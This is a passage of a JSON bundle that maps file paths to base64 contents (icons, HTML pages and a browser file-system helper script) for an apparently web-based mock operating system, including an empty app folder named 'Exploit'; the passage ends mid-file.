"PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMTIgMkM2LjQ3IDIgMiA2LjQ3IDIgMTJzNC40NyAxMCAxMCAxMCAxMC00LjQ3IDEwLTEwUzE3LjUzIDIgMTIgMnptNSAxMy41OUwxNS41OSAxNyAxMiAxMy40MSA4LjQxIDE3IDcgMTUuNTkgMTAuNTkgMTIgNyA4LjQxIDguNDEgNyAxMiAxMC41OSAxNS41OSA3IDE3IDguNDEgMTMuNDEgMTIgMTcgMTUuNTl6Ii8+DQogICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPg0KPC9zdmc+", "/system/res/drawable/arrowBackLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTIwIDExSDcuODNsNS41OS01LjU5TDEyIDRsLTggOCA4IDggMS40MS0xLjQxTDcuODMgMTNIMjB2LTJ6Ii8+DQo8L3N2Zz4=", "/system/app/Exploit/script": {}, "/system/app/Home/res/drawable/favicon.ico": "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////////////////////////4+Pj/8zMzP/MzMz/zMzM/8zMzP+IjNHPN0Tb/zdE2/83RNv/N0Tb/zdE2/83RNjwOkbcFgC085gAtPT/ALT0/wC09P8AtPT/ALT0/xC28PbJycnzzMzM/8zMzP/MzMz/zs7O//39/f/////////////////////////////////9/f3/zs7O/8zMzP/MzMz/zMzM/8nJyfNFTtf2N0Tb/zdE2/83RNv/N0Tb/zdE2/83RdyYALTz9QC09P+J3Pr/Ucz3/wC09P8AtPT/m8fTzczMzP/MzMz/zMzM/8zMzP/Z2dn////////////////////////////////////////////Z2dn/zMzM/8zMzP/MzMz/zMzM/6quzs03RNv/N0Tb/3eA5/+jqe7/N0Tb/zdB2/QAsfT0ALT0/4rd+v9SzPj/ALT0/wSr5+XHsabQzMzM/8zMzP/MzMz/zMzM/9nZ2f///////////////////////////////////////////9nZ2f/MzMz/zMzM/8zMzP/MzMz/qq7OzTdE2/83RNv/d3/m/6Ko7v83RNv/N0HY9QC085gAtPT/ALT0/wC09P8AtPT/j4h13dV7R/fJycnzzMzM/8zMzP/MzMz/zs7O//39/f/////////////////////////////////9/f3/zs7O/8zMzP/MzMz/zMzM/8nJyfNFTtf2N0Tb/zdE2/83RNv/N0Tb/zdE2/83RdyYALnzFgCz9PAAtPT/ALT0/xym0tXbdzv/23c7/9ajh9HMzMz/zMzM/8zMzP/MzMz/4+Pj/////////////////////////////////+Pj4//MzMz/zMzM/8zMzP/MzMz/iIzRzzdE2/83RNv/N0Tb/zdE2/83RNv/N0TY8DpG3BYAAAAAALP0bwC09P8AsvD6t4BT7tt3O//nfj7/84ZF/87HxuHMzMz/zMzM/8zMzP/MzMz/4uLi//z8/P////////////z8/P/i4uL/zMzM/8zMzP/MzMz/zMzM/8bGzeE6R9v/N0Tb/zdE2/83RNv/N0Tb/zdE2/83RdpvAAAAAAAAAAAAv/8EALT01EeYrM/bdzv/6X8///SFQv/0hUL/45tt3szMzP/MzMz/zMzM/8zMzP/MzMz/zc3N/9XV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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "/system/app/Exploit/res/drawable": {}, "/index.html": "PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCiAgICA8aGVhZD4NCiAgICAgICAgPG1ldGEgY29udGVudD0ndXNlci1zY2FsYWJsZT0wJyBuYW1lPSd2aWV3cG9ydCcvPg0KICAgIDwvaGVhZD4NCiAgICA8Ym9keT4NCiAgICAgICAgPHNjcmlwdCBzcmM9Ii4uL3N5c3RlbS9zY3JpcHQvaW5pdC5qcyI+PC9zY3JpcHQ+DQogICAgPC9ib2R5Pg0KPC9odG1sPg==", "/system/app/Exploit/res/drawable/dropdown.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik03IDEwbDUgNSA1LTV6Ii8+CiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+Cjwvc3ZnPg==", "/system/app/FireBug/index.html": "PGh0bWw+DQoJPGhlYWQ+DQoJCTx0aXRsZT4NCgkJCUZpcmVCdWcgTGl0ZQ0KCQk8L3RpdGxlPg0KCTwvaGVhZD4NCgk8Ym9keT4NCgkJPGE+DQoJCQlGaXJlQnVnIExpdGUNCgkJPC9hPg0KCQk8c2NyaXB0IHNyYz0iYXBwLmpzIj48L3NjcmlwdD4NCgk8L2JvZHk+DQo8L2h0bWw+", "/system/script/fileSystem.js": "bG9hZGluZ1NjcmVlbi5zZXRNZXNzYWdlKCdGaWxlIExvYWRlZCEnKTsNCmxvYWRpbmdTY3JlZW4uc2V0UGVyY2VudGFnZSgyNSk7DQooZnVuY3Rpb24oKSB7DQogICd1c2Ugc3RyaWN0JzsNCiAgdmFyIHJvb3Q7DQogIHZhciBnZXRGaWxlTmFtZTsNCiAgdmFyIHJlY3Vyc2l2ZURhdGE7DQogIHZhciBnZXRQYXJlbnREaXI7DQogIHZhciBmc0xvZzsNCiAgdmFyIGZzRXJyb3I7DQogIHZhciBfbG9nID0gZnVuY3Rpb24obWVzc2FnZSwgcHJpb3JpdHkpIHsNCiAgICB2YXIgcHJpbnQgPSBbDQogICAgICBmdW5jdGlvbigpIHt9LA0KICAgICAgY29uc29sZS5sb2csDQogICAgICBjb25zb2xlLndhcm4sDQogICAgICBjb25zb2xlLmVycm9yLA0KICAgICAgYWxlcnQNCiAgICBdOw0KICAgIHByaW50W3ByaW9yaXR5XS5jYWxsKHRoaXMsIG1lc3NhZ2UpOw0KICB9Ow0KICBnZXRQYXJlbnREaXIgPSBmdW5jdGlvbihwYXRoTmFtZSkgew0KICAgIHZhciBmaWxlUG9zID0gcGF0aE5hbWUubGFzdEluZGV4T2YoJy8nLCBwYXRoTmFtZS5sZW5ndGggLSAxKTsNCiAgICByZXR1cm4gcGF0aE5hbWUuc3Vic3RyaW5nKDAsIGZpbGVQb3MpOw0KICB9Ow0KICBnZXRGaWxlTmFtZSA9IGZ1bmN0aW9uKHBhdGhOYW1lKSB7DQogICAgcmV0dXJuIHBhdGhOYW1lLnN1YnN0cmluZyhwYXRoTmFtZS5sYXN0SW5kZXhPZignLycpICsgMSwgcGF0aE5hbWUubGVuZ3RoKTsNCiAgfTsNCiAgZnNFcnJvciA9IGZ1bmN0aW9uKG1lc3NhZ2UsIGVycikgew0KICAgIG1lc3NhZ2UgPSBtZXNzYWdlIHx8ICdBbm9ueW1vdXMgT3BlcmF0aW9uIEZhaWxlZCc7DQogICAgX2xvZyhtZXNzYWdlLCAzKTsNCiAgICBpZiAoZXJyKSB7DQogICAgICBfbG9nKGVyciwgMyk7DQogICAgfQ0KICB9Ow0KICBmc0xvZyA9IGZ1bmN0aW9uKG1lc3NhZ2UpIHsNCiAgICBtZXNzYWdlID0gbWVzc2FnZSB8fCAnQW5vbnltb3VzIE9wZXJhdGlvbiBTdWNjZXNzJzsNCiAgICBfbG9nKG1lc3NhZ2UsIDEpOw0KICB9Ow0KICB3aW5kb3cuZnMgPSB7DQogICAgZGVsZXRlOiBmdW5jdGlvbihkZXRhaWxzKSB7DQogICAgICBkZXRhaWxzLmNhbGxiYWNrID0gZGV0YWlscy5jYWxsYmFjayB8fCBmdW5jdGlvbigpIHt9Ow0KICAgICAgZGV0YWlscy5wYXRoID0gZGV0YWlscy5wYXRoOw0KICAgICAgaWYgKGRldGFpbHMudHlwZSA9PSAnZm9sZGVyJykgew0KICAgICAgICByb290LmdldERpcmVjdG9yeShkZXRhaWxzLnBhdGgsIHtjcmVhdGU6IGZhbHNlfSwgZnVuY3Rpb24oZGlyKSB7DQogICAgICAgICAgZGlyLnJlbW92ZVJlY3Vyc2l2ZWx5KGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgZnNMb2coJ2ZzLmRlbGV0ZTogRm9sZGVyIGRlbGV0ZWQuJyk7DQogICAgICAgICAgICBkZXRhaWxzLmNhbGxiYWNrKHRydWUpOw0KICAgICAgICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgICAgICAgZnNFcnJvcignZnMuZGVsZXRlOiBGb2xkZXIgY2Fubm90IGJlIGRlbGV0ZWQuJywgZXJyKTsNCiAgICAgICAgICAgIGRldGFpbHMuY2FsbGJhY2soZmFsc2UpOw0KICAgICAgICAgIH0pOw0KICAgICAgICB9LCBmdW5jdGlvbihlcnIpIHsNCiAgICAgICAgICBmc0Vycm9yKCdmcy5kZWxldGU6IEZvbGRlciBQYXRoIGNhbm5vdCBiZSBhY2Nlc3NlZC4nLCBlcnIpOw0KICAgICAgICAgIGRldGFpbHMuY2FsbGJhY2soZmFsc2UpOw0KICAgICAgICB9KTsNCiAgICAgIH1lbHNlIGlmIChkZXRhaWxzLnR5cGUgPT0gJ2ZpbGUnKSB7DQogICAgICAgIHJvb3QuZ2V0RGlyZWN0b3J5KGdldFBhcmVudERpcihkZXRhaWxzLnBhdGgpLCB7Y3JlYXRlOiBmYWxzZX0sDQogICAgICAgIGZ1bmN0aW9uKGRpcikgew0KICAgICAgICAgIGRpci5nZXRGaWxlKGdldEZpbGVOYW1lKGRldGFpbHMucGF0aCksIHtjcmVhdGU6IGZhbHNlfSwNCiAgICAgICAgICBmdW5jdGlvbihmaWxlKSB7DQogICAgICAgICAgICBmaWxlLnJlbW92ZShmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgZnNMb2coJ2ZzLmRlbGV0ZTogRmlsZSBkZWxldGVkLicpOw0KICAgICAgICAgICAgICBkZXRhaWxzLmNhbGxiYWNrKHRydWUpOw0KICAgICAgICAgICAgfSwgZnVuY3Rpb24oZXJyKSB7DQogICAgICAgICAgICAgIGZzRXJyb3IoJ2ZzLmRlbGV0ZTogRmlsZSBjYW5ub3QgYmUgZGVsZXRlZC4nLCBlcnIpOw0KICAgICAgICAgICAgfSk